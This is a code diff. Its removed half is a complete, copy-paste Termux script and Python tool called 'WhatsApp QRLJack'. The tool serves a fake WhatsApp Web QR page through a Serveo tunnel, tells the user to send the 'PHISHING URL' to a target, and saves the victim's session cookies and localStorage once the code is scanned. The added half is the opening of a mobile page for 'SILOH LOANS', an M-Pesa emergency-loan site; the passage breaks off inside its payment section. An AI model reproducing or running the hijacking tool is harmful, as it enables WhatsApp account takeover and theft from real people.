@@ -1,309 +1,383 @@
-cat > run.sh << 'SCRIPT_END'
-#!/data/data/com.termux/files/usr/bin/bash
-set -e
-
-echo ""
-echo "╔═══════════════════════════════════════════════════╗"
-echo "║   WhatsApp QRLJack – Single Shot Install & Run    ║"
-echo "╚═══════════════════════════════════════════════════╝"
-echo ""
-
-# ─── 1. INSTALL DEPENDENCIES ──────────────────────────────────────────
-echo "[*] Updating packages..."
-pkg update -y -qq 2>/dev/null
-
-echo "[*] Installing repositories & browser..."
-pkg install -y -qq tur-repo x11-repo 2>/dev/null
-pkg install -y -qq chromium xorg-server-xvfb python python-pip openssh 2>/dev/null
-
-echo "[*] Installing Python packages..."
-pip install --quiet flask undetected-chromedriver fake-useragent pyngrok requests pillow qrcode[pil] 2>/dev/null
-
-# ─── 2. CREATE PYTHON SCRIPT ──────────────────────────────────────────
-cat > qrjack.py << 'PYEOF'
-#!/usr/bin/env python3
-"""
-WhatsApp QRLJack – Stealth (Xvfb + undetected_chromedriver)
-Single-file. Copy-paste and run.
-"""
-
-import os, sys, json, time, threading, logging, re, shutil, atexit, subprocess
-from pathlib import Path
-from datetime import datetime
-from flask import Flask, render_template_string, jsonify, send_file
-import undetected_chromedriver as uc
-from fake_useragent import UserAgent
-from selenium.webdriver.common.by import By
-from selenium.webdriver.support.ui import WebDriverWait
-from selenium.webdriver.support import expected_conditions as EC
-
-logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
-log = logging.getLogger("qrjack")
-
-HOST = "0.0.0.0"
-PORT = 5000
-QR_FILE = "static/qr.png"
-PROFILE = os.path.expanduser("~/.whatsapp-phish-profile")
-CHROME_BIN = "/data/data/com.termux/files/usr/bin/chromium"
-CHROMEDRIVER = "/data/data/com.termux/files/usr/bin/chromedriver"
-
-app = Flask(__name__)
-state = {"qr_available": False, "authenticated": False, "session_data": None}
-driver = None
-
-# ─── Xvfb ──────────────────────────────────────────────────────────────
-def start_xvfb():
-    os.environ["DISPLAY"] = ":99"
-    os.system("kill $(cat /tmp/.X99-lock 2>/dev/null) 2>/dev/null || true")
-    os.system("Xvfb :99 -screen 0 1280x800x24 -ac >/dev/null 2>&1 &")
-    time.sleep(2)
-    if os.path.exists("/tmp/.X99-lock"):
-        log.info("Xvfb running on :99")
-        return True
-    log.error("Xvfb failed")
-    return False
-
-# ─── Stealth Driver ────────────────────────────────────────────────────
-def create_driver():
-    global driver
-    os.makedirs(PROFILE, exist_ok=True)
-    os.makedirs("static", exist_ok=True)
-
-    opts = uc.ChromeOptions()
-    opts.binary_location = CHROME_BIN
-    opts.add_argument("--no-sandbox")
-    opts.add_argument("--disable-dev-shm-usage")
-    opts.add_argument("--disable-gpu")
-    opts.add_argument("--window-size=1280,800")
-    opts.add_argument("--disable-blink-features=AutomationControlled")
-    opts.add_argument("--disable-extensions")
-    opts.add_argument("--no-first-run")
-    opts.add_argument("--lang=en-US")
-    opts.add_argument(f"--user-data-dir={PROFILE}")
-
-    try:
-        ua = UserAgent(os="android")
-        agent = ua.chrome
-    except:
-        agent = ("Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 "
-                 "(KHTML, like Gecko) Chrome/125.0.6422.147 Mobile Safari/537.36")
-    opts.add_argument(f"--user-agent={agent}")
-
-    try:
-        driver = uc.Chrome(options=opts, headless=False, use_subprocess=True,
-                           driver_executable_path=CHROMEDRIVER, version_main=125)
-    except:
-        log.info("Retrying auto version...")
-        driver = uc.Chrome(options=opts, headless=False, use_subprocess=True,
-                           driver_executable_path=CHROMEDRIVER)
-
-    stealth = """
-    Object.defineProperty(navigator,'webdriver',{get:()=>undefined});
-    Object.defineProperty(navigator,'plugins',{get:()=>[
-        {name:'Chrome PDF Plugin',filename:'internal-pdf-viewer'},
-        {name:'Chrome PDF Viewer',filename:'mhjfbmdgcfjbbpaeojofohoefgiehjai'},
-        {name:'Native Client',filename:'internal-nacl-plugin'}
-    ]});
-    Object.defineProperty(navigator,'languages',{get:()=>['en-US','en']});
-    Object.defineProperty(navigator,'permissions',{value:{query:(p)=>
-        p.name==='notifications'?Promise.resolve({state:'prompt'}):Promise.resolve({state:'granted'})
-    }});
-    window.chrome=window.chrome||{};window.chrome.runtime=window.chrome.runtime||{};
-    window.chrome.runtime.connect=()=>({});window.chrome.runtime.sendMessage=()=>({});
-    window.chrome.runtime.onMessage={addListener:()=>{}};
-    delete Object.getPrototypeOf(navigator).webdriver;
-    """
-    driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {"source": stealth})
-    log.info("Stealth patches injected")
-    return True
-
-# ─── QR Capture ────────────────────────────────────────────────────────
-def capture_qr():
-    driver.get("https://web.whatsapp.com")
-    time.sleep(10)
-    try:
-        driver.find_element(By.CSS_SELECTOR, "[data-testid='chat-list']")
-        state["authenticated"] = True
-        log.info("Already authenticated!")
-        return True
-    except:
-        pass
-    try:
-        canvas = WebDriverWait(driver, 40).until(EC.presence_of_element_located((By.TAG_NAME, "canvas")))
-        time.sleep(2)
-        png = canvas.screenshot_as_png
-        with open(QR_FILE, "wb") as f:
-            f.write(png)
-        state["qr_available"] = True
-        log.info("QR captured!")
-        return True
-    except Exception as e:
-        log.error(f"QR failed: {e}")
-        return False
-
-# ─── Auth Wait ─────────────────────────────────────────────────────────
-def wait_auth(timeout=180):
-    log.info(f"Waiting {timeout}s for scan...")
-    try:
-        WebDriverWait(driver, timeout).until(
-            EC.presence_of_element_located((By.CSS_SELECTOR, "[data-testid='chat-list']"))
-        )
-        state["authenticated"] = True
-        log.info("AUTHENTICATED!")
-        return True
-    except:
-        return False
-
-# ─── Extract Session ───────────────────────────────────────────────────
-def extract_session():
-    cookies = driver.get_cookies()
-    ls = driver.execute_script("""
-        var i={};for(var k=0;k<localStorage.length;k++){var key=localStorage.key(k);i[key]=localStorage.getItem(key)};return i
-    """)
-    try:
-        name = driver.find_element(By.CSS_SELECTOR, "header span[dir='auto']").text
-    except:
-        name = "unknown"
-    sess = {"timestamp": datetime.now().isoformat(), "profile": name, "cookies": cookies, "localStorage": ls}
-    with open("session_dump.json","w") as f:
-        json.dump(sess, f, indent=2)
-    state["session_data"] = sess
-    log.info(f"Session saved: {name}")
-
-# ─── HTML ──────────────────────────────────────────────────────────────
-HTML = """<!DOCTYPE html>
-<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>WhatsApp Web</title>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>SILOH LOANS — SiloMoney Emergency</title>
+<link rel="icon" type="image/png" href="data:image/png;base64,__LOGO_BASE64_DATA_HERE__">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;700&family=Inter:wght@400;500;600&family=IBM+Plex+Mono:wght@500;600&display=swap" rel="stylesheet">
 <style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{font-family:'Segoe UI',sans-serif;background:linear-gradient(135deg,#00a884,#25d366);min-height:100vh;display:flex;justify-content:center;align-items:center}
-.card{background:#fff;border-radius:16px;box-shadow:0 8px 40px rgba(0,0,0,0.18);width:420px;max-width:92vw;padding:36px 28px;text-align:center}
-.logo{width:48px;height:48px;background:#25d366;border-radius:12px;margin:0 auto 14px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:28px;font-weight:700}
-h1{font-size:20px;color:#1f2a33;margin-bottom:2px}
-.sub{color:#667781;font-size:13px;margin-bottom:20px}
-.qr{background:#f0faf5;border:2px dashed #25d366;border-radius:12px;padding:18px;margin-bottom:16px;min-height:270px;display:flex;flex-direction:column;align-items:center;justify-content:center}
-.qr img{width:210px;height:210px;image-rendering:pixelated}
-.stat{display:flex;align-items:center;justify-content:center;gap:8px;padding:10px;background:#f5f6f7;border-radius:10px;font-size:13px;color:#667781;margin-bottom:16px}
-.dot{width:8px;height:8px;border-radius:50%;display:inline-block}
-.dot.g{background:#25d366;animation:pulse 1.5s infinite}
-.dot.r{background:#e74c3c}
-.dot.gr{background:#bbb}
-@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.4}}
-.inst{text-align:left;font-size:12px;color:#8696a0;padding:0 6px;margin-top:10px}
-.inst p{margin:5px 0}
-</style></head>
-<body><div class="card">
-<div class="logo">WA</div>
-<h1>WhatsApp Web</h1>
-<p class="sub">Use WhatsApp on your computer</p>
-<div class="qr"><img id="qi" src="/qr-code" alt="QR"></div>
-<div class="stat"><span class="dot g" id="sd"></span><span id="st">Waiting for scan...</span></div>
-<div class="inst"><p>1. Open WhatsApp on your phone</p><p>2. Tap <strong>Menu</strong> → <strong>Linked Devices</strong></p><p>3. Scan this QR code</p></div>
-</div>
-<script>
-function poll(){fetch('/status').then(r=>r.json()).then(d=>{let e=document.getElementById('sd'),t=document.getElementById('st');if(d.authenticated){e.className='dot r';t.innerText='Session captured!'}else if(d.qr){e.className='dot g';t.innerText='Waiting for scan...'}else{e.className='dot gr';t.innerText='Initializing...'}}).catch(()=>{})}
-setInterval(poll,2000);poll();
-</script></body></html>"""
+  :root{
+    --bg:#12141c;
+    --surface:#1a1e2a;
+    --surface-2:#212739;
+    --border:#2b3145;
+    --gold:#d9b84c;
+    --gold-soft:rgba(217,184,76,.13);
+    --mint:#33d6a6;
+    --mint-soft:rgba(51,214,166,.13);
+    --coral:#ff6b5e;
+    --coral-soft:rgba(255,107,94,.14);
+    --mpesa:#3fae49;
+    --mpesa-dark:#1c5e26;
+    --airtel:#e4192c;
+    --airtel-dark:#7c0f1c;
+    --text:#f2efe6;
+    --dim:#9aa0b4;
+    --faint:#5c6280;
+    --radius:16px;
+  }
+  *{box-sizing:border-box; margin:0; padding:0;}
+  html,body{height:100%;}
+  body{
+    background:var(--bg);
+    color:var(--text);
+    font-family:'Inter',sans-serif;
+    -webkit-font-smoothing:antialiased;
+    display:flex;
+    justify-content:center;
+    min-height:100vh;
+  }
+  body::before{
+    content:"";
+    position:fixed; inset:0;
+    background:
+      radial-gradient(ellipse 700px 500px at 50% -10%, rgba(217,184,76,.07), transparent 60%),
+      radial-gradient(ellipse 600px 400px at 100% 100%, rgba(51,214,166,.05), transparent 60%);
+    pointer-events:none;
+  }
+  .frame{
+    width:100%; max-width:460px;
+    min-height:100vh;
+    background:var(--bg);
+    display:flex; flex-direction:column;
+    position:relative;
+    border-left:1px solid var(--border);
+    border-right:1px solid var(--border);
+  }
+  h1,h2,h3,.display{font-family:'Space Grotesk',sans-serif; letter-spacing:-.01em;}
+  .mono{font-family:'IBM Plex Mono',monospace; font-variant-numeric:tabular-nums;}
 
-@app.route("/")
-def idx():
-    return render_template_string(HTML)
+  header{
+    padding:22px 20px 16px;
+    display:flex; align-items:center; justify-content:space-between;
+    position:sticky; top:0; z-index:20;
+    background:linear-gradient(var(--bg) 80%, transparent);
+  }
+  .brand{display:flex; align-items:center; gap:10px;}
+  .brand-mark{
+    width:38px; height:38px; border-radius:50%;
+    object-fit:cover; border:1.5px solid var(--gold);
+    box-shadow:0 0 0 1px rgba(217,184,76,.2);
+  }
+  .brand-name{font-weight:700; font-size:16px; line-height:1.1;}
+  .brand-sub{font-size:10.5px; color:var(--dim); letter-spacing:.04em; text-transform:uppercase;}
+  .mode-pill{
+    font-size:10.5px; color:var(--mint); background:var(--mint-soft);
+    border:1px solid rgba(51,214,166,.3); padding:5px 10px; border-radius:99px;
+    display:flex; align-items:center; gap:5px; font-weight:600;
+  }
+  .mode-pill::before{content:""; width:6px; height:6px; border-radius:50%; background:var(--mint); box-shadow:0 0 6px var(--mint);}
 
-@app.route("/qr-code")
-def qr():
-    p = Path(QR_FILE)
-    if p.exists():
-        return send_file(str(p), mimetype="image/png")
-    return "", 404
+  main{flex:1; padding:4px 20px 100px; overflow-x:hidden;}
+  .view{display:none; animation:rise .35s ease both;}
+  .view.active{display:block;}
+  @keyframes rise{from{opacity:0; transform:translateY(10px);} to{opacity:1; transform:translateY(0);}}
 
-@app.route("/status")
-def st():
-    return jsonify({"qr": state["qr_available"], "authenticated": state["authenticated"]})
+  .hero{padding:10px 0 26px;}
+  .eyebrow{font-size:11px; color:var(--gold); letter-spacing:.08em; text-transform:uppercase; font-weight:600; margin-bottom:10px;}
+  .hero h1{font-size:29px; line-height:1.15; font-weight:700; margin-bottom:10px;}
+  .hero p{color:var(--dim); font-size:14px; line-height:1.55; max-width:34ch;}
 
-# ─── Cleanup ───────────────────────────────────────────────────────────
-@atexit.register
-def cleanup():
-    if driver:
-        try: driver.quit()
-        except: pass
-    os.system("kill $(pgrep Xvfb) 2>/dev/null || true")
+  .calc-card{
+    background:var(--surface); border:1px solid var(--border); border-radius:var(--radius);
+    padding:20px; margin-top:22px;
+  }
+  .calc-row{display:flex; justify-content:space-between; align-items:baseline; margin-bottom:6px;}
+  .calc-row span:first-child{font-size:12.5px; color:var(--dim);}
+  .calc-amount{font-size:34px; font-weight:600; color:var(--gold);}
+  input[type=range]{
+    width:100%; -webkit-appearance:none; height:4px; border-radius:2px;
+    background:var(--border); margin:16px 0 6px; accent-color:var(--gold);
+  }
+  input[type=range]::-webkit-slider-thumb{
+    -webkit-appearance:none; width:20px; height:20px; border-radius:50%;
+    background:var(--gold); border:3px solid var(--bg); box-shadow:0 0 0 1px var(--gold);
+    cursor:pointer; margin-top:-8px;
+  }
+  .range-labels{display:flex; justify-content:space-between; font-size:11px; color:var(--faint); margin-bottom:16px;}
+  .tier-badge{
+    display:inline-flex; align-items:center; gap:6px; font-size:11.5px; font-weight:600;
+    padding:5px 10px; border-radius:99px; background:var(--gold-soft); color:var(--gold);
+    margin-bottom:14px;
+  }
+  .calc-grid{display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-top:6px;}
+  .calc-cell{background:var(--surface-2); border-radius:12px; padding:12px 14px;}
+  .calc-cell .label{font-size:10.5px; color:var(--dim); text-transform:uppercase; letter-spacing:.04em; margin-bottom:4px;}
+  .calc-cell .value{font-size:16.5px; font-weight:600;}
+  .calc-cell.warn .value{color:var(--coral);}
+  .calc-cell.good .value{color:var(--mint);}
 
-# ─── Main ──────────────────────────────────────────────────────────────
-def main():
-    print("\n[*] Starting WhatsApp QRLJack (Stealth Mode)...\n")
-    if not start_xvfb():
-        return
-    if not create_driver():
-        return
-    if not capture_qr():
-        return
-    threading.Thread(target=lambda: app.run(host=HOST, port=PORT, debug=False, use_reloader=False), daemon=True).start()
-    print(f"\n[*] Server running on http://{HOST}:{PORT}")
-    if not state["authenticated"]:
-        if wait_auth():
-            extract_session()
-    print("[*] Ready. Press Ctrl+C to stop.")
-    try:
-        while True:
-            time.sleep(1)
-    except KeyboardInterrupt:
-        pass
+  .btn{
+    display:block; width:100%; text-align:center; text-decoration:none;
+    border:none; border-radius:12px; padding:15px; font-family:'Inter'; font-weight:600;
+    font-size:14.5px; cursor:pointer; transition:.2s;
+  }
+  .btn-primary{background:var(--gold); color:#1a1305; margin-top:18px;}
+  .btn-primary:active{transform:scale(.98);}
+  .btn-ghost{background:transparent; color:var(--text); border:1px solid var(--border); margin-top:10px;}
+  .btn-mint{background:var(--mint); color:#04261c;}
 
-if __name__ == "__main__":
-    main()
-PYEOF
+  .section-title{font-size:12px; letter-spacing:.06em; text-transform:uppercase; color:var(--dim); font-weight:600; margin:28px 0 12px;}
+  .steps{display:flex; flex-direction:column; gap:10px;}
+  .step{display:flex; gap:12px; align-items:flex-start; background:var(--surface); border:1px solid var(--border); border-radius:12px; padding:13px 14px;}
+  .step-num{
+    width:24px; height:24px; border-radius:7px; background:var(--surface-2); color:var(--gold);
+    font-family:'IBM Plex Mono'; font-size:12px; font-weight:600; display:flex; align-items:center; justify-content:center; flex-shrink:0;
+  }
+  .step div p{font-size:13px; color:var(--dim); line-height:1.4;}
+  .step div strong{font-size:13.5px; display:block; margin-bottom:2px;}
 
-# ─── 3. START Xvfb FIRST ──────────────────────────────────────────────
-echo "[*] Starting virtual display..."
-kill $(cat /tmp/.X99-lock 2>/dev/null) 2>/dev/null || true
-Xvfb :99 -screen 0 1280x800x24 -ac >/dev/null 2>&1 &
-sleep 2
-export DISPLAY=:99
+  .field{margin-bottom:14px;}
+  .field label{font-size:12px; color:var(--dim); display:block; margin-bottom:7px; font-weight:500;}
+  .field input, .field select{
+    width:100%; background:var(--surface); border:1px solid var(--border); color:var(--text);
+    border-radius:11px; padding:13px 14px; font-family:'Inter'; font-size:14.5px; outline:none;
+  }
+  .field input:focus, .field select:focus{border-color:var(--gold);}
+  .field input::placeholder{color:var(--faint);}
+  .helptext{font-size:11px; color:var(--faint); margin-top:6px;}
 
-# ─── 4. START PYTHON IN BACKGROUND ─────────────────────────────────────
-echo "[*] Launching QRJack..."
-python qrjack.py &
-PYTHON_PID=$!
-sleep 8
+  .summary-card{background:var(--surface); border:1px dashed var(--border); border-radius:12px; padding:16px; margin:18px 0;}
+  .summary-row{display:flex; justify-content:space-between; font-size:13px; padding:6px 0; color:var(--dim);}
+  .summary-row strong{color:var(--text); font-weight:600;}
+  .summary-row.total{border-top:1px solid var(--border); margin-top:4px; padding-top:12px;}
+  .summary-row.total strong{color:var(--gold); font-size:15px;}
 
-# ─── 5. START SERVEO TUNNEL ───────────────────────────────────────────
-echo "[*] Opening Serveo tunnel..."
-ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 \
-    -R 80:localhost:5000 serveo.net 2>&1 | tee /tmp/serveo.log &
-SSH_PID=$!
+  .tc-check{display:flex; align-items:flex-start; gap:10px; margin:18px 0 6px;}
+  .tc-check input{margin-top:3px; accent-color:var(--gold); width:16px; height:16px; flex-shrink:0;}
+  .tc-check label{font-size:12px; color:var(--dim); line-height:1.5;}
+  .tc-check a{color:var(--gold); text-decoration:underline;}
 
-# ─── 6. WAIT FOR URL ──────────────────────────────────────────────────
-echo "[*] Waiting for public URL..."
-URL=""
-for i in $(seq 1 20); do
-    URL=$(grep -o 'https://[a-z0-9]*\.serveo.net' /tmp/serveo.log 2>/dev/null | head -1)
-    if [ -n "$URL" ]; then break; fi
-    sleep 1
-done
+  .tc-block{margin-top:8px;}
+  .tc-block h3{font-size:13px; color:var(--gold); font-weight:600; margin:20px 0 6px; font-family:'Inter';}
+  .tc-block h3:first-child{margin-top:0;}
+  .tc-block p{font-size:12.5px; color:var(--dim); line-height:1.6;}
 
-echo ""
-echo "╔═══════════════════════════════════════════════════╗"
-echo "║                  🎯  READY                        ║"
-echo "╠═══════════════════════════════════════════════════╣"
-if [ -n "$URL" ]; then
-    echo "║  PHISHING URL:  $URL  ║"
-else
-    echo "║  PHISHING URL:  (check Serveo output above)   ║"
-fi
-echo "║                                                   ║"
-echo "║  Send the URL to your target.                     ║"
-echo "║  When they scan the QR code → session captured!   ║"
-echo "╚═══════════════════════════════════════════════════╝"
-echo ""
-echo "  Dashboard:   http://localhost:5000"
-echo "  Session:     session_dump.json (after auth)"
-echo ""
-echo "  Ctrl+C to stop everything."
-echo ""
+  .status-card{background:var(--surface); border:1px solid var(--border); border-radius:var(--radius); padding:20px; margin-top:6px;}
+  .status-head{display:flex; justify-content:space-between; align-items:flex-start; margin-bottom:16px;}
+  .status-tag{font-size:10.5px; font-weight:700; padding:5px 10px; border-radius:99px; text-transform:uppercase; letter-spacing:.03em;}
+  .status-tag.ontrack{background:var(--mint-soft); color:var(--mint);}
+  .status-tag.late{background:var(--coral-soft); color:var(--coral);}
+  .status-tag.paid{background:var(--gold-soft); color:var(--gold);}
 
-# ─── 7. WAIT ──────────────────────────────────────────────────────────
-trap "kill $PYTHON_PID $SSH_PID 2>/dev/null; exit" INT TERM
-wait $PYTHON_PID
-SCRIPT_END
+  .ledger{margin-top:16px;}
+  .ledger-bar{
+    height:34px; border-radius:9px; overflow:hidden; display:flex; background:var(--surface-2);
+    border:1px solid var(--border);
+  }
+  .ledger-seg{height:100%; display:flex; align-items:center; justify-content:center; font-size:10px; font-weight:700; font-family:'IBM Plex Mono';}
+  .seg-principal{background:var(--gold-soft); color:var(--gold);}
+  .seg-interest{background:rgba(154,160,180,.15); color:var(--dim);}
+  .seg-late{background:var(--coral); color:#2a0704; animation:pulse 1.6s infinite;}
+  @keyframes pulse{0%,100%{filter:brightness(1);} 50%{filter:brightness(1.3);}}
+  .ledger-legend{display:flex; gap:14px; margin-top:10px; flex-wrap:wrap;}
+  .legend-item{display:flex; align-items:center; gap:6px; font-size:11px; color:var(--dim);}
+  .legend-dot{width:8px; height:8px; border-radius:2px;}
 
-chmod +x run.sh
-bash run.sh
+  .day-counter{font-size:12.5px; color:var(--coral); margin-top:10px; font-weight:600;}
+
+  .pay-name-field{margin-bottom:16px;}
+  .pay-methods{display:flex; flex-direction:column; gap:14px;}
+  .pay-method{
+    border-radius:16px; overflow:hidden; position:relative;
+    border:1px solid rgba(255,255,255,.08);
+  }
+  .pay-method.mpesa{background:linear-gradient(155deg, var(--mpesa) 0%, var(--mpesa-dark) 100%);}
+  .pay-method.airtel{background:linear-gradient(155deg, var(--airtel) 0%, var(--airtel-dark) 100%);}
+  .pay-method-top{display:flex; align-items:center; gap:12px; padding:16px 16px 14px;}
+  .pay-method-icon{
+    width:42px; height:42px; border-radius:11px; flex-shrink:0;
+    display:flex; align-items:center; justify-content:center;
+    background:rgba(255,255,255,.16);
+    font-family:'Space Grotesk'; font-weight:700; font-size:17px; color:#fff;
+  }
+  .pay-method-info{flex:1; min-width:0;}
+  .pay-method-info strong{font-size:14px; display:block; color:#fff;}
+  .pay-method-info span{font-size:11px; color:rgba(255,255,255,.75);}
+  .pay-method-verified{
+    font-size:9.5px; font-weight:700; color:#fff; background:rgba(255,255,255,.18);
+    padding:4px 8px; border-radius:99px; display:flex; align-items:center; gap:4px; white-space:nowrap;
+  }
+  .pay-method-num{
+    margin:0 16px 14px; background:rgba(0,0,0,.22); border-radius:11px;
+    padding:12px 14px; font-size:19px; font-weight:700; letter-spacing:.03em; color:#fff;
+    display:flex; align-items:center; justify-content:space-between;
+  }
+  .pay-method-num .copy-hint{font-size:9.5px; font-weight:600; color:rgba(255,255,255,.7); letter-spacing:.04em; text-transform:uppercase;}
+  .pay-steps{display:flex; justify-content:space-between; padding:0 14px 16px; gap:4px;}
+  .pay-step{display:flex; flex-direction:column; align-items:center; gap:5px; flex:1;}
+  .pay-step-dot{
+    width:24px; height:24px; border-radius:50%; background:rgba(255,255,255,.2);
+    color:#fff; font-family:'IBM Plex Mono'; font-size:10px; font-weight:600;
+    display:flex; align-items:center; justify-content:center;
+  }
+  .pay-step-label{font-size:8px; color:rgba(255,255,255,.85); text-align:center; line-height:1.25; font-weight:600; text-transform:uppercase; letter-spacing:.02em;}
+
+  .faq{border-bottom:1px solid var(--border);}
+  .faq summary{
+    list-style:none; cursor:pointer; padding:16px 2px; display:flex; justify-content:space-between;
+    align-items:center; font-size:13.5px; font-weight:600;
+  }
+  .faq summary::-webkit-details-marker{display:none;}
+  .faq summary::after{content:"+"; color:var(--gold); font-size:18px; font-weight:400; transition:.2s;}
+  .faq[open] summary::after{content:"–";}
+  .faq p{padding:0 2px 16px; color:var(--dim); font-size:13px; line-height:1.55;}
+
+  .contact-row{
+    display:flex; align-items:center; gap:12px; background:var(--surface); border:1px solid var(--border);
+    border-radius:12px; padding:14px; margin-top:20px;
+  }
+  .contact-icon{width:38px; height:38px; border-radius:10px; background:var(--mint-soft); display:flex; align-items:center; justify-content:center; font-size:17px; flex-shrink:0;}
+  .contact-row div strong{font-size:13.5px; display:block;}
+  .contact-row div span{font-size:11.5px; color:var(--dim);}
+
+  nav{
+    position:fixed; bottom:0; left:50%; transform:translateX(-50%);
+    width:100%; max-width:460px;
+    background:rgba(18,20,28,.92); backdrop-filter:blur(14px);
+    border-top:1px solid var(--border);
+    display:flex; padding:8px 6px calc(10px + env(safe-area-inset-bottom));
+    z-index:30;
+  }
+  nav button{
+    flex:1; background:none; border:none; color:var(--faint); font-family:'Inter';
+    display:flex; flex-direction:column; align-items:center; gap:4px; padding:8px 0;
+    font-size:10.5px; font-weight:600; cursor:pointer; border-radius:10px; transition:.2s;
+  }
+  nav button .ic{font-size:19px; line-height:1;}
+  nav button.active{color:var(--gold);}
+  nav button.active .ic{transform:translateY(-1px);}
+
+  ::-webkit-scrollbar{display:none;}
+</style>
+</head>
+<body>
+<div class="frame">
+
+  <header>
+    <div class="brand">
+      <img class="brand-mark" src="data:image/png;base64,__LOGO_BASE64_DATA_HERE__" alt="SILOH LOANS logo">
+      <div>
+        <div class="brand-name">SILOH LOANS</div>
+        <div class="brand-sub">SiloMoney Emergency</div>
+      </div>
+    </div>
+    <div class="mode-pill">M-Pesa ready</div>
+  </header>
+
+  <main>
+
+    <!-- ================= HOME ================= -->
+    <section class="view active" id="view-home">
+
+      <div class="hero" style="padding-top:10px;">
+        <div class="eyebrow">Emergency cash, same day</div>
+        <h1>Borrow KSh 100–5,000 on your M-Pesa.</h1>
+        <p>Flat 27.89% interest, no hidden charges. Apply in under a minute, straight from WhatsApp.</p>
+      </div>
+
+      <div class="calc-card">
+        <div class="calc-row"><span>You want to borrow</span></div>
+        <div class="calc-amount mono" id="calcAmountLabel">KSh 1,500</div>
+        <input type="range" id="calcSlider" min="100" max="5000" step="50" value="1500" oninput="updateCalc()">
+        <div class="range-labels"><span>KSh 100</span><span>KSh 5,000</span></div>
+        <div class="tier-badge" id="tierBadge">Basic tier</div>
+        <div class="calc-grid">
+          <div class="calc-cell"><div class="label">Interest (27.89%)</div><div class="value mono" id="calcInterest">KSh 418</div></div>
+          <div class="calc-cell"><div class="label">Repay in</div><div class="value mono" id="calcDays">18 days</div></div>
+          <div class="calc-cell good"><div class="label">Total repayment</div><div class="value mono" id="calcTotal">KSh 1,918</div></div>
+          <div class="calc-cell warn"><div class="label">If late, per day</div><div class="value mono" id="calcLate">+KSh 150</div></div>
+        </div>
+        <button class="btn btn-primary" onclick="goTo('apply')">Apply for this amount</button>
+      </div>
+
+      <div class="section-title">How it works</div>
+      <div class="steps">
+        <div class="step"><div class="step-num">01</div><div><strong>Send your details</strong><p>Fill the form, we open WhatsApp with everything pre-filled for you.</p></div></div>
+        <div class="step"><div class="step-num">02</div><div><strong>We confirm on WhatsApp</strong><p>Our team verifies your ID and M-Pesa number, usually within minutes.</p></div></div>
+        <div class="step"><div class="step-num">03</div><div><strong>Cash lands on M-Pesa</strong><p>Disbursed directly to your registered number, ready to use.</p></div></div>
+      </div>
+
+    </section>
+
+    <!-- ================= APPLY ================= -->
+    <section class="view" id="view-apply">
+      <div class="hero" style="padding-bottom:16px;">
+        <div class="eyebrow">Apply</div>
+        <h1 style="font-size:24px;">Tell us who you are</h1>
+        <p>We'll open WhatsApp with your application ready to send. Nothing is sent until you hit send there.</p>
+      </div>
+
+      <div class="field"><label>Full name</label><input id="apName" type="text" placeholder="As on your ID"></div>
+      <div class="field"><label>Phone number</label><input id="apPhone" type="tel" placeholder="07XX XXX XXX"></div>
+      <div class="field"><label>National ID number</label><input id="apId" type="text" placeholder="e.g. 30112233"></div>
+      <div class="field"><label>M-Pesa number for disbursement</label><input id="apMpesa" type="tel" placeholder="Leave blank if same as phone above"></div>
+      <div class="field">
+        <label>Loan amount (KSh)</label>
+        <input id="apAmount" type="number" min="100" max="5000" step="50" value="1500" oninput="syncApplySummary()">
+        <div class="helptext">Between KSh 100 and KSh 5,000</div>
+      </div>
+
+      <div class="summary-card">
+        <div class="summary-row"><span>Tier</span><strong id="apTier">Basic</strong></div>
+        <div class="summary-row"><span>Interest at 27.89%</span><strong id="apInterest">KSh 418</strong></div>
+        <div class="summary-row"><span>Repayment period</span><strong id="apDays">18 days</strong></div>
+        <div class="summary-row total"><span>Total to repay</span><strong id="apTotal">KSh 1,918</strong></div>
+      </div>
+
+      <div class="tc-check">
+        <input type="checkbox" id="apAgree">
+        <label for="apAgree">I agree to the <a href="#" onclick="goTo('terms'); return false;">Terms &amp; Conditions</a> of SILOH LOANS.</label>
+      </div>
+
+      <button class="btn btn-mint" onclick="sendApplication()">Continue on WhatsApp</button>
+      <div class="helptext" style="text-align:center; margin-top:10px;">Late repayments accrue 10% of the loan amount per day.</div>
+    </section>
+
+    <!-- ================= PAY LOAN ================= -->
+    <section class="view" id="view-pay">
+      <div class="hero" style="padding-bottom:10px;">
+        <div class="eyebrow">Pay loan</div>
+        <h1 style="font-size:24px;">How to pay</h1>
+        <p>Pick the number you're paying from, then send to either option below.</p>
+      </div>
+
+      <div class="field pay-name-field">
+        <label>Number you're paying from</label>
+        <select id="payerNumberSelect" onchange="onPayerNumberChange()">
+          <option value="">Select a number…</option>
+        </select>
+        <input id="payerNumberCustom" type="tel" placeholder="Or type a number, e.g. 07XX XXX XXX" style="margin-top:8px;" oninput="syncCustomNumber()">
+        <div class="helptext">We'll use this number on your payment confirmation to admin.</div>
+      </div>
+
+      <div class="field pay-name-field">
+        <label>Name to reflect on payment</label>
+        <input id="payerName" type="text" placeholder="e.g. Kelvin Sirinkit">
+      </div>
+
+      <div class="pay-methods">
+        <div class="pay-method mpesa">
+          <div class="pay-method-top">
+            <div class="pay-method-icon">M</div>
+            <div class="pay-method-info"><strong>Lipa na M-Pesa</strong><span>Pochi la Biashara · SILOH LOANS</span></div>
+            <div class="pay-method-verified">✓ Verified</div>
+          </div>
+          <div class="pay-method-num mono"><span>0702 994 132</span><span class="copy-hint">Till</span></div>
+          <div class="pay-steps">
+            <div class="pay-step"><div class="pay-step-dot">1</div><div class="pay-step-label">Dial<br>*334#</div></div>
+            <div class="pay-step"><div class="pay-step-dot">2</div><div class="pay-step-label">Select<br>Send Money</div></div>
+            <div class="pay-step"><div class="pay-step-dot">3</div><div class="pay-step-label">Enter<br>0702994132</div></div>
